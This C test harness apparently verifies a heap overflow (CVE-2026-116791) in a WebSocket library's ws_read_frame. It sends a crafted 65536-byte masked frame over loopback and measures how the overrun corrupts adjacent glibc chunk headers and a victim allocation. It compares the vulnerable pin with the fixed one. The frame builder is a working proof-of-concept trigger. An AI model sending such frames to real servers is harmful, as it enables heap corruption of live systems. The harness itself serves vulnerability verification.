/*
 * Real-allocator layout test for CVE-2026-116791 / GHSA-whfw-c3jj-99rp.
 *
 * The function under test is INCLUDED VERBATIM from the pinned ws.c slice
 * produced by frontier's gen_fn.py / verify_verbatim.py (fns-<pin>.inc).
 * Everything else here is the real host path: a real 64 KiB malloc for
 * bbuffer (the pin's own ws_init size), a real loopback TCP socketpair that
 * feeds an attacker-shaped WebSocket frame byte-for-byte, and a real glibc
 * allocation order (wsh->buffer then wsh->bbuffer, as in ws_init).
 *
 * ASan build: no readback (would itself fault); let ws_read_frame report.
 * Plain build (-DPLAIN_MODE): snapshot the bytes after the requested bbuffer
 * size before the call, then read them back afterwards to see exactly which
 * glibc chunk-header offsets the 14 XOR bytes and the NUL reach.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>
#include <byteswap.h>
#include <endian.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <errno.h>

#ifndef WS_BLOCK
#define WS_BLOCK 10000
#endif

typedef int ws_socket_t;
struct SSL; struct SSL_CTX;
typedef struct SSL SSL;
typedef struct SSL_CTX SSL_CTX;

typedef enum { WS_NONE=0, WS_NORMAL=1000, WS_PROTO_ERR=1002, WS_DATA_TOO_BIG=1009 } ws_cause_t;
typedef enum {
    WSOC_CONTINUATION=0x0, WSOC_TEXT=0x1, WSOC_BINARY=0x2,
    WSOC_CLOSE=0x8, WSOC_PING=0x9, WSOC_PONG=0xA
} ws_opcode_t;

/* Verbatim field layout from pinned ws.h (only SSL typedefs differ). */
typedef struct wsh_sws {
    ws_socket_t sock;
    char *buffer;
    char *bbuffer;
    char *body;
    char *uri;
    size_t buflen;
    size_t bbuflen;
    ssize_t datalen;
    char *payload;
    ssize_t plen;
    ssize_t rplen;
    ssize_t packetlen;
    SSL *ssl;
    int handshake;
    uint8_t down;
    int secure;
    uint8_t close_sock;
    SSL_CTX *ssl_ctx;
    int block;
    int sanity;
    int secure_established;
    int logical_established;
    int stay_open;
    int x;
    int ssl_io_error;
    void *write_buffer;
    size_t write_buffer_len;
    ssize_t payload_size_max;
} wsh_t;

/* --- real loopback socket read path ------------------------------------ */
#define BBUF_LEN 65536
#define PAYLOAD_LEN_FULL 65536
#define PAYLOAD_LEN_SHORT 65520
#define MASK0 0x41u
#define MASK1 0x5au
#define MASK2 0x42u
#define MASK3 0x43u

static int g_srv_fd = -1;

/* A real read(2) from an accepted loopback TCP socket, in the shape of the
 * pinned ws_raw_read(wsh, data, bytes, block): returns byte count or -1. */
static ssize_t feed(void *data, size_t bytes)
{
    ssize_t r;
    do {
        r = read(g_srv_fd, data, bytes);
    } while (r < 0 && errno == EINTR);
    return r;
}

int establish_logical_layer(wsh_t *wsh) { (void)wsh; return 0; }
ssize_t ws_raw_read(wsh_t *wsh, void *data, size_t bytes, int block)
{ (void)wsh; (void)block; return feed(data, bytes); }
ssize_t ws_raw_read_blocking(wsh_t *wsh, char *data, size_t max_bytes, int max_retries)
{ (void)wsh; (void)max_retries; return feed(data, max_bytes); }
ssize_t ws_close(wsh_t *wsh, int16_t reason) { (void)wsh; (void)reason; return -1; }
ssize_t ws_write_frame(wsh_t *wsh, ws_opcode_t oc, void *data, size_t bytes)
{ (void)wsh; (void)oc; (void)data; return (ssize_t)bytes; }

uint64_t ntoh64(uint64_t val)
{
    if (__BYTE_ORDER == __BIG_ENDIAN) return val;
    return bswap_64(val);
}

/* --- verbatim pinned function ------------------------------------------- */
#include FNS

/* --- helpers ------------------------------------------------------------ */
static int make_loopback_pair(int *cli_out)
{
    int lsn, cli, srv;
    struct sockaddr_in addr;
    socklen_t alen = sizeof(addr);

    lsn = socket(AF_INET, SOCK_STREAM, 0);
    if (lsn < 0) return -1;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_port = 0;
    if (bind(lsn, (struct sockaddr *)&addr, sizeof(addr)) < 0 ||
        listen(lsn, 1) < 0) { close(lsn); return -1; }
    if (getsockname(lsn, (struct sockaddr *)&addr, &alen) < 0) { close(lsn); return -1; }

    cli = socket(AF_INET, SOCK_STREAM, 0);
    if (cli < 0) { close(lsn); return -1; }
    if (connect(cli, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(cli); close(lsn); return -1;
    }
    srv = accept(lsn, (struct sockaddr *)&addr, &alen);
    close(lsn);
    if (srv < 0) { close(cli); return -1; }
    *cli_out = cli;
    return srv;
}

static void write_all(int fd, const uint8_t *buf, size_t len)
{
    size_t off = 0;
    while (off < len) {
        ssize_t w = write(fd, buf + off, len - off);
        if (w < 0) { if (errno == EINTR) continue; break; }
        off += (size_t)w;
    }
}

static void build_frame(uint8_t *frame, size_t payload_len)
{
    uint64_t be;
    size_t i;
    const uint8_t mask[4] = { MASK0, MASK1, MASK2, MASK3 };

    frame[0] = 0x82;                    /* FIN | WSOC_BINARY */
    frame[1] = 0xFF;                    /* MASK | 127 (64-bit length) */
    be = htobe64((uint64_t)payload_len);
    memcpy(frame + 2, &be, 8);
    memcpy(frame + 10, mask, 4);
    for (i = 0; i < payload_len; i++)
        frame[14 + i] = (uint8_t)(0x11u + (i % 7u));
}

int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "vuln";
    int safe = (strcmp(mode, "safe") == 0);
    int do_abort = (strcmp(mode, "abort") == 0);
    int do_victim = (strcmp(mode, "victim") == 0);
    size_t payload_len = safe ? PAYLOAD_LEN_SHORT : PAYLOAD_LEN_FULL;
    const uint8_t mask[4] = { MASK0, MASK1, MASK2, MASK3 };
    wsh_t *wsh;
    ws_opcode_t oc = WSOC_CONTINUATION;
    uint8_t *data = NULL, *frame;
    ssize_t rv;
    int cli_fd;
    size_t usable;
#ifdef PLAIN_MODE
    uint8_t snap[48], after[48];
    uint8_t *victim = NULL;
    uint8_t vsnap[24], vsize[8];
    size_t k;
#endif

    frame = (uint8_t *)malloc(14 + payload_len);
    if (!frame) return 2;
    build_frame(frame, payload_len);

    g_srv_fd = make_loopback_pair(&cli_fd);
    if (g_srv_fd < 0) { fprintf(stderr, "LOOPBACK_FAIL\n"); return 2; }
    write_all(cli_fd, frame, 14 + payload_len);

    /* Real ws_init allocation order: buffer first, then bbuffer. */
    wsh = (wsh_t *)calloc(1, sizeof(*wsh));
    if (!wsh) return 2;
    wsh->handshake = 1;
    wsh->buflen = BBUF_LEN;
    wsh->buffer = (char *)malloc(wsh->buflen);          /* ws_init: line 743 */
#ifdef PIN_FIXED
    wsh->bbuflen = BBUF_LEN;
    wsh->bbuffer = (char *)malloc(wsh->bbuflen + 1);    /* fixed ws_init: +1 slot */
#else
    wsh->bbuflen = BBUF_LEN;
    wsh->bbuffer = (char *)malloc(wsh->bbuflen);        /* vuln ws_init: line 744 */
#endif
    if (!wsh->buffer || !wsh->bbuffer) return 2;
    wsh->payload_size_max = 4 * 1024 * 1024;
    wsh->block = WS_BLOCK;
    wsh->sock = g_srv_fd;
    wsh->body = wsh->bbuffer;

    usable = malloc_usable_size(wsh->bbuffer);

#ifdef PLAIN_MODE
    /* Snapshot 48 bytes starting at the requested bbuffer boundary. These
     * are the bytes the 14-byte XOR extent (offsets 65536..65549) and the
     * NUL (offset 65536) can reach on a natural glibc layout. */
    memcpy(snap, wsh->bbuffer + BBUF_LEN, sizeof(snap));
    if (do_victim) {
        victim = (uint8_t *)malloc(128);
        memset(victim, 0xC3, 128);
        memcpy(snap, wsh->bbuffer + BBUF_LEN, sizeof(snap));
        memcpy(vsnap, victim, sizeof(vsnap));
        memcpy(vsize, victim - 8, sizeof(vsize));
        fprintf(stderr, "VICTIM_OFF=%zd VICTIM_SIZE_BEFORE=",
                victim - (uint8_t *)wsh->bbuffer);
        for (k = 0; k < sizeof(vsize); k++) fprintf(stderr, "%02x", vsize[k]);
        fprintf(stderr, "\n");
    }
#endif

    fprintf(stderr, "PRECALL PIN=%s MODE=%s PAYLOAD=%zu BBUFLEN=%zu USABLE=%zu MASK=%02x%02x%02x%02x\n",
            PIN, mode, payload_len, wsh->bbuflen, usable,
            mask[0], mask[1], mask[2], mask[3]);

    rv = ws_read_frame(wsh, &oc, &data);

#ifdef PLAIN_MODE
    /* Capture the post-frame bytes into stack immediately: any printf or
     * malloc here would perturb the very heap metadata being measured. */
    memcpy(after, wsh->bbuffer + BBUF_LEN, sizeof(after));
    if (victim) {
        fprintf(stderr, "VICTIM_DATA_BEFORE=");
        for (k = 0; k < 8; k++) fprintf(stderr, "%02x", vsnap[k]);
        fprintf(stderr, " VICTIM_DATA_AFTER=");
        for (k = 0; k < 8; k++) fprintf(stderr, "%02x", victim[k]);
        fprintf(stderr, " VICTIM_SIZE_AFTER=");
        for (k = 0; k < sizeof(vsize); k++) fprintf(stderr, "%02x", victim[-8 + k]);
        fprintf(stderr, "\n");
    }
#endif

    fprintf(stderr, "PIN=%s MODE=%s RV=%zd DATALEN=%zd RPLEN=%zd BBLEN=%zu USABLE=%zu OC=%d\n",
           PIN, mode, rv, wsh->datalen, wsh->rplen, wsh->bbuflen,
           usable, (int)oc);

#ifdef PLAIN_MODE
    {
        int bad = 0;
        fprintf(stderr, "BEFORE");
        for (k = 0; k < sizeof(snap); k++) fprintf(stderr, " %02x", snap[k]);
        fprintf(stderr, "\nAFTER ");
        for (k = 0; k < sizeof(snap); k++) fprintf(stderr, " %02x", after[k]);
        fprintf(stderr, "\n");
        /* At the natural layout, offsets +0..+7 are the next chunk's
         * prev_size (inside malloc's 65544 usable space); offsets +8..+13
         * are the low 6 bytes of the next chunk's size field. */
        fprintf(stderr, "META_OFF=+8 NEXT_SIZE_BEFORE=");
        for (k = 8; k < 16; k++) fprintf(stderr, "%02x", snap[k]);
        fprintf(stderr, " NEXT_SIZE_AFTER=");
        for (k = 8; k < 16; k++) fprintf(stderr, "%02x", after[k]);
        fprintf(stderr, "\n");
#if defined(PIN_FIXED)
        /* Fixed pin: +1 slot absorbs the NUL; the loop is rplen-bounded. */
        for (k = 0; k < sizeof(snap); k++)
            if (after[k] != snap[k]) bad = 1;
        fprintf(stderr, "CONTROL=FIXED_PIN_UNTOUCHED\n");
#else
        if (safe) {
            /* Short frame: XOR stays inside the 64 KiB allocation. */
            for (k = 0; k < sizeof(snap); k++)
                if (after[k] != snap[k]) bad = 1;
            fprintf(stderr, "CONTROL=SHORT_FRAME_UNTOUCHED\n");
        } else {
            for (k = 1; k <= 13; k++) {
                uint8_t expect = (uint8_t)(snap[k] ^ mask[k % 4]);
                if (after[k] != expect) bad = 1;
            }
            if (after[0] != 0x00u) bad = 1;
        }
#endif
        fprintf(stderr, "XOR_DELTA_BAD=%d NUL=%02x\n", bad, after[0]);
        if (do_abort) {
            void *p = malloc(64);
            fprintf(stderr, "POST_MALLOC_PTR=%p\n", p);
        }
        return bad;
    }
#else
    fprintf(stderr, "ASAN_CASE_DONE %s\n", mode);
    return 0;
#endif
}
